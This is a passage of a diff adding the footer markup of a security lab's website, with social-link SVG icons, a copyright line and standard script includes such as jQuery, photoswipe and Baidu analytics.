+  <path d="M872.405333 872.618667h-151.637333v-237.610667c0-56.661333-1.152-129.578667-79.018667-129.578667-79.061333 0-91.136 61.653333-91.136 125.397334v241.792H398.976V384h145.664v66.602667h1.962667c20.352-38.4 69.845333-78.933333 143.786666-78.933334 153.642667 0 182.058667 101.12 182.058667 232.746667v268.202667zM227.712 317.141333a87.978667 87.978667 0 0 1-88.021333-88.106666 88.064 88.064 0 1 1 88.021333 88.106666z m76.032 555.477334H151.68V384h152.064v488.618667zM948.266667 0H75.562667C33.792 0 0 33.024 0 73.770667v876.458666C0 991.018667 33.792 1024 75.562667 1024h872.576C989.866667 1024 1024 991.018667 1024 950.229333V73.770667C1024 33.024 989.866667 0 948.138667 0h0.128z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="weibo"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M385.714286 733.714286q12-19.428571 6.285714-39.428571t-25.714286-28.571429q-19.428571-8-41.714286-0.571429t-34.285714 26.285714q-12.571429 19.428571-7.428571 39.142857t24.571429 28.857143 42.571429 1.428571 35.714286-27.142857zm53.714286-69.142857q4.571429-7.428571 2-15.142857t-10-10.571429q-8-2.857143-16.285714 2.857143t-12.285714 10.571429q-9.714286 17.714286 7.428571 25.714286 8 2.857143 16.571429 2.857143t12.571429-10.571429zm99.428571 61.142857q-25.714286 58.285714-90.285714 85.714286t-128 6.857143q-61.142857-19.428571-84.285714-72.285714t3.714286-107.142857q26.857143-53.142857 86.571429-79.428571t120.285714-10.857143q63.428571 16.571429 90.571429 68.285714t1.428571 108.857143zm178.285714-91.428571q-5.142857-54.857143-50.857143-97.142857t-119.142857-62.285714-156.857143-12q-127.428571 13.142857-211.142857 80.857143t-75.714286 151.142857q5.142857 54.857143 50.857143 97.142857t119.142857 62.285714 156.857143 12q127.428571-13.142857 211.142857-80.857143t75.714286-151.142857zm176 2.285714q0 38.857143-21.142857 79.714286t-62.285714 78.285714-96.285714 67.142857-129.142857 47.428571-154.571429 17.714286-157.142857-19.142857-137.428571-53.142857-98-86.285714-37.142857-114q0-65.714286 39.714286-140t112.857143-147.428571q96.571429-96.571429 195.142857-134.857143t140.857143 4q37.142857 36.571429 11.428571 119.428571-2.285714 8-0.571429 11.428571t5.714286 4 8.285714 2.857143 7.714286-2l3.428571-1.142857q79.428571-33.714286 140.571429-33.714286t87.428571 34.857143q25.714286 36 0 101.714286-1.142857 7.428571-2.571429 11.428571t2.571429 7.142857 6.857143 4.285714 9.714286 3.428571q32.571429 10.285714 58.857143 26.857143t45.714286 46.571429 19.428571 66.571429zm-42.285714-356.571429q24 26.857143 31.142857 62t-3.714286 67.142857q-4.571429 13.142857-16.857143 19.428571t-25.428571 2.285714q-13.142857-4.571429-19.428571-16.857143t-2.285714-25.428571q11.428571-36-13.714286-63.428571t-61.142857-20q-13.714286 2.857143-25.714286-4.571429t-14.285714-21.142857q-2.857143-13.714286 4.571429-25.428571t21.142857-14.571429q34.285714-7.428571 68 3.142857t57.714286 37.428571zm103.428571-93.142857q49.714286 54.857143 64.285714 127.142857t-7.714286 138q-5.142857 15.428571-19.428571 22.857143t-29.714286 2.285714-22.857143-19.428571-2.857143-29.714286q16-46.857143 5.714286-98.285714t-45.714286-90.285714q-35.428571-39.428571-84.571429-54.571429t-98.857143-4.857143q-16 3.428571-29.714286-5.428571t-17.142857-24.857143 5.428571-29.428571 24.857143-16.857143q70.285714-14.857143 139.428571 6.571429t118.857143 76.857143z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="zhihu"  target="_blank"
+      >
+      <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M351.791182 562.469462l192.945407 0c0-45.367257-21.3871-71.939449-21.3871-71.939449L355.897709 490.530013c3.977591-82.182744 7.541767-187.659007 8.816806-226.835262l159.282726 0c0 0-0.86367-67.402109-18.578124-67.402109s-279.979646 0-279.979646 0 16.850783-88.141456 39.318494-127.053698c0 0-83.60514-4.510734-112.121614 106.962104S81.344656 355.077018 76.80834 367.390461c-4.536316 12.313443 24.62791 5.832845 36.941354 0 12.313443-5.832845 68.050885-25.924439 84.252893-103.69571l86.570681 0c1.165546 49.28652 4.596691 200.335724 3.515057 226.835262L109.86113 490.530013c-25.275663 18.147312-33.701566 71.939449-33.701566 71.939449L279.868105 562.469462c-8.497535 56.255235-23.417339 128.763642-44.275389 167.210279-33.05279 60.921511-50.55235 116.65793-169.802314 212.576513 0 0-19.442818 14.257725 40.829917 9.073656 60.273758-5.185093 117.305683-20.739347 156.840094-99.807147 20.553105-41.107233 41.805128-93.250824 58.386782-146.138358l-0.055259 0.185218 167.855986 193.263655c0 0 22.035876-51.847855 5.832845-108.880803L371.045711 650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
